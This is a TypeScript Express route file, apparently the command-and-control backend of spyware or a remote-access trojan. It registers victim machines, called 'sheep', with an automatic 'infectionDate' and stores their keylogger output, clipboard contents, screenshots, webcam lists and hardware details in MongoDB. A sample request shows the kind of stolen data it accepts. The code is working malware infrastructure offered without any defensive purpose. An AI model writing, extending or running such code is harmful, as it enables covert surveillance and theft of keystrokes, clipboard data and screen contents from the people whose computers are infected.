import { Request, Response } from 'express';
import Sheep from '../../../../mongo/models/sheep';

export default {
    handle: "/good-sheep",
    method: "POST",
    description: "Sheep route",
    route: async (req: Request, res: Response) => {
        const { name, ip, region, webcams, screenshots, keylog, clipboard, screenshot, devices, hardware, os }: {
            name: string;
            ip: string;
            region: string;
            webcams?: string[];
            screenshots?: string[];
            keylog?: { keylogDate: Date; data: string }[];
            clipboard?: { clipboardDate: Date; data: string }[];
            screenshot?: { screenshotDate: Date; file: Buffer }[];
            devices?: string[];
            hardware?: {
                cpu: string;
                ram: string;
                storage: string;
                gpu: string;
            };
            os?: {
                name: string;
                version: string;
            };
        } = req.body;

        try {
            // Vérifiez si un Sheep avec le même nom ou la même adresse IP existe déjà
            const existingSheep = await Sheep.findOne({ $or: [{ name }, { ip }] });
            if (existingSheep) {
                res.status(400).json({ success: false, error: "Sheep with the same name or IP already exists" });
                return;
            }

            // Créez un nouveau Sheep
            const newSheep = new Sheep({
                name,
                ip,
                region,
                active: true,
                lastActivity: new Date(),
                infectionDate: new Date(), // Génération automatique de la date d'infection
                webcams: webcams || [],
                screenshots: screenshots || [],
                keylog: keylog || [],
                clipboard: clipboard || [],
                screenshot: screenshot || [],
                devices: devices || [],
                hardware: hardware || {},
                os: os || {}
            });

            await newSheep.save();

            res.status(200).json({ success: true, sheep: newSheep._id });
        } catch (error) {
            res.status(500).json({ success: false, error: "An error occurred while creating the sheep" });
        }
    }
};

/*
Exemple de requête:
{
    "name": "Sheep1",
    "ip": "192.168.1.1",
    "region": "Europe",
    "webcams": ["webcam1", "webcam2"],
    "screenshots": ["screenshot1", "screenshot2"],
    "keylog": [
        { "keylogDate": "2023-05-27T08:30:00Z", "data": "keylog data" }
    ],
    "clipboard": [
        { "clipboardDate": "2023-05-27T08:30:00Z", "data": "clipboard data" }
    ],
    "screenshot": [
        { "screenshotDate": "2023-05-27T08:30:00Z", "file": "some binary data" }
    ],
    "devices": ["device1", "device2"],
    "hardware": {
        "cpu": "Intel i7",
        "ram": "16GB",
        "storage": "512GB SSD",
        "gpu": "NVIDIA GTX 1080"
    },
    "os": {
        "name": "Windows",
        "version": "10"
    }
}
*/
